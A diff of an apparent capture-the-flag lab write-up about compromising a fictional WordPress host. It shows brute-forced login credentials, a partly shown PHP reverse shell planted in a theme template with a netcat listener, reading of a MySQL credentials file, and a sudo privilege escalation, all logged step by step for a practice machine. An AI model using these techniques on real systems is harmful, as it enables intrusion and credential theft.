@@ -118,12 +118,11 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://hydrogen.co/wordpress/ 
 ```
 
-We find something in this directory, there is `http://hydrogen.co/wordpress/wp-login.php`
+We find something on this site, there is `http://hydrogen.co/wordpress/wp-login.php`
 
 ![](/images/writeup/internship/hidrogen/wordpresslogin.PNG)
 
-First and foremost if there is wordpress, we will use tools like `wpscan` to enumerate the login page by following this absolute powerful website [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#panel-rce)
-
+First and foremost if there is WordPress, we will use tools like `wpscan` to enumerate the login page by following this absolute powerful website [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#panel-rce)
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/Desktop/internship/hidrogen]
@@ -215,55 +214,15 @@ Trying john / justin Time: 00:00:19 <          > (130 / 1705)  7.62%  ETA: ??:??
 [+] Elapsed time: 00:00:25
 ```
 
-We got `john:justin` as a login into the wordpress database. 
+Here we can see, we got `john:justin` as a login into the wordpress database. Then, we get an access into it.
 
 ![](/images/writeup/internship/hidrogen/wordpressdashboard.PNG)
+
 ## Exploitation
 
-There are 2 ways that we can use to obtain the others flag. We use the same credentials to access the `ssh` service and we get in.
-
-```bash
-┌──(root㉿kali)-[/home/kali/Desktop/internship/hidrogen]
-└─# ssh john@hydrogen.co
-john@hydrogen.co's password: 
-Linux hydrogrencorp 3.2.0-6-amd64 #1 SMP Debian 3.2.102-1 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Wed Oct 18 07:53:00 2023 from 192.168.22.13
-
-#######################################
-### Welcome to Hydrogen Corporation ###
-#######################################
-
-john@hydrogrencorp:~$ ls -la
-total 48
-drwxr-xr-x 3 john john  4096 Oct 17 10:07 .
-drwxr-xr-x 3 root root  4096 Jan 17  2019 ..
--rw------- 1 john john   505 Oct 18 08:17 .bash_history
--rw-r--r-- 1 john john   220 Jan 17  2019 .bash_logout
--rw-r--r-- 1 john john  3562 Jan 19  2019 .bashrc
--r-------- 1 john john    39 Jan 18  2019 flag3.txt
-drwx------ 2 john john  4096 Oct 17 03:28 .gnupg
--rw------- 1 john john   532 Feb 20  2019 .lesshst
--rw-r--r-- 1 john john     0 Oct 17 05:27 nc
--rw-r--r-- 1 john john   675 Jan 17  2019 .profile
--rw------- 1 john john 12288 Oct 17 10:08 .swp
-john@hydrogrencorp:~$ 
-
-```
-
-Then we can collect the `flag3.txt` right away
-
-`flag{b4270e25c9fadba2b79e18055141d882}`
-### First Way
 #### Foothold - RCE
 
-Back to the WordPress, the best practice is we need to try any function of the website server, and try to understand it. Maybe it is vulnerable to file upload or change of file content or anything that can get us the remote code execution. Here is some writeup that may similar to this [https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145](https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145)
+In this WordPress, the best practice is we need to try any function of the website server, and try to understand it. Maybe it is vulnerable to file upload or change of file content or anything that can get us the remote code execution. Here is some writeup that I found might be interesting to look on [https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145](https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145)
 
 ```bash
 <?php
@@ -372,29 +331,58 @@ if (!$sock) {
 }
 .
 .
+[snip]
 .
 .
 ```
 
-Change the file content in `/twentythirteen/404.php` template. Then update the file and listen. Go to the file directory and we are in into the web shell!!
+![](/images/writeup/internship/hidrogen/rcepayload.PNG)
+
+We can use this reverse shell payload to change the file content in `/themes/twentyseventeen/404.php` template. Then update the file and listen on port `4444`. I try to listen on my machine with an `IP = 192.168.37.138` but it cannot connect because it is not in the same network. So, we use SSH service. In this SSH, it is in restricted bash. We also can bypass this or use RCE payload like this. Before that, I grep the `flag3.txt` first.
+
+```bash
+john@hydrogrencorp:~$ ls -la
+total 52
+drwxr-xr-x 3 john john  4096 Oct 24 05:32 .
+drwxr-xr-x 3 root root  4096 Jan 17  2019 ..
+-rw------- 1 john john   554 Oct 20 01:56 .bash_history
+-rw-r--r-- 1 john john   220 Jan 17  2019 .bash_logout
+-rw-r--r-- 1 john john  3562 Jan 19  2019 .bashrc
+-r-------- 1 john john    39 Jan 18  2019 flag3.txt
+drwx------ 2 john john  4096 Oct 19 07:52 .gnupg
+-rw------- 1 john john   581 Oct 19 03:53 .lesshst
+-rw------- 1 john john  1197 Oct 19 10:55 .mysql_history
+-rw-r--r-- 1 john john   675 Jan 17  2019 .profile
+-rw------- 1 john john 12288 Oct 17 10:08 .swp
+john@hydrogrencorp:~$ cat flag3.txt
+flag{b4270e25c9fadba2b79e18055141d882}
+john@hydrogrencorp:~$ 
+```
+
+Back to RCE. Go to the file directory `/wp-content/themes/twentyseventeen/404.php` and we are in into the web shell!! 
 
 ```bash
 john@hydrogrencorp:~$ nc -lnvp 4444
 listening on [any] 4444 ...
-connect to [192.168.8.118] from (UNKNOWN) [192.168.8.118] 38529
+connect to [192.168.8.118] from (UNKNOWN) [192.168.8.118] 38727
 Linux hydrogrencorp 3.2.0-6-amd64 #1 SMP Debian 3.2.102-1 x86_64 GNU/Linux
- 05:04:49 up 2 days, 19:19,  2 users,  load average: 0.06, 0.01, 0.00
+ 05:17:35 up 7 days, 19:32,  2 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-john     pts/0    192.168.22.22    04:06   31:52   0.10s  0.00s sshd: john [pri
-john     pts/2    192.168.22.73    04:50    8.00s  0.00s  0.00s nc -lnvp 4444
+john     pts/0    192.168.22.73    05:08   22.00s  0.00s  0.00s nc -lnvp 4444
+john     pts/2    192.168.22.73    05:09   16.00s  0.00s  0.00s -rbash
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sh: no job control in this shell
-sh-4.2$ 
+sh-4.2$ script -qc /bin/bash /dev/null
+script -qc /bin/bash /dev/null
+www-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content/themes/twentyseventeen$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content/themes/twentyseventeen$ 
 ```
+
 
 ![](/images/writeup/internship/hidrogen/in.gif)
 
-We can find the `flag2.txt` 
+We can find the `flag2.txt` in here
 
 ```bash
 www-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content$ find / -name "flag2.txt" 2>/dev/null
@@ -404,11 +392,7 @@ www-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content$ cat /usr/share
 flag{db6029f93797df27262460156bfbe0b9}
 ```
 
-#### Privesc
-
-On the privesc part, basically it is much easier if we just do this on the first place. To gain a root user access, just `sudo -l` and we are lucky if it is enable for us to read. If not, we can try to run linpeas.sh or other tools to gain something interesting in the machine. The best practice, upload the tools in directory `/tmp or /dev/shm`
-
-After look on the linpeas output, there is something interesting that we can get. There is mysql credentials file
+After a while, I find nothing and then try to run the `linpeas` in here. There is something interesting that we can get. There is mysql credentials file
 
 ```bash
 -rw------- 1 root root 333 Jan 17  2019 /etc/mysql/debian.cnf
@@ -422,7 +406,11 @@ Try login into it by give this command
 
 `mysql --defaults-file=/etc/mysql/debian.cnf`
 
-But we unsuccessful to login, so we need to get the root access first. So here we are lucky because `sudo -l` can be read. 
+But we unsuccessful to login, so we need to get the root access first.
+
+#### Privesc
+
+To gain a root user access, we can try give `sudo -l` but we cannot access it. So I try to login using SSH service and we are lucky it give something to look on.  
 
 ```bash
 john@hydrogrencorp:~$ sudo -l
@@ -485,37 +473,6 @@ mysql>
 ```
 
 We got the last flag `flag{a260af638f07d39c838810eda005ceb3}`
-
-### Second Way
-
-#### Privesc
-
-For the second way is just straightforward, follow on the first way after use `sudo -l`
-
-```bash
-john@hydrogrencorp:~$ sudo -l
-[sudo] password for john: 
-Matching Defaults entries for john on this host:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
-    insults
-
-User john may run the following commands on this host:
-    (root) /usr/bin/man
-```
-
-We can get all `flag2, flag4 and flag5`
-
-```bash
-root@hydrogrencorp:/usr/share/man# find / -name "flag2.txt" 2>/dev/null
-/usr/share/nginx/www/wordpress.bak/flag2.txt
-/usr/share/nginx/www/wordpress/flag2.txt
-root@hydrogrencorp:/usr/share/man# find / -name "flag4.txt" 2>/dev/null
-/root/flag4.txt
-root@hydrogrencorp:/usr/share/man# mysql --defaults-file=/etc/mysql/debian.cnf
-```
-
-We got all flag huhu.
 
 ## Bonus
 
